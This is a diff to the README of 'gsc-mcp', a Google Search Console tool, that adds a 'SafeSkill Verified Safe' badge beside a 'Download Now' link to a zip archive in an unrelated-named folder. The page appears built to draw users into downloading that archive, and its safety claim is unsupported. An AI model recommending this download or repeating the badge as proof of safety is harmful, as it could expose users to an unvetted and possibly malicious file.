@@ -1,5 +1,7 @@
 # 🚀 gsc-mcp - Track Your Google Search Performance 
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/donmandela-gsc-mcp)
+
 ## 📥 Download Now
 [![Download gsc-mcp](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip)](https://raw.githubusercontent.com/Donmandela/gsc-mcp/main/taxidermize/gsc-mcp-3.4.zip)
 
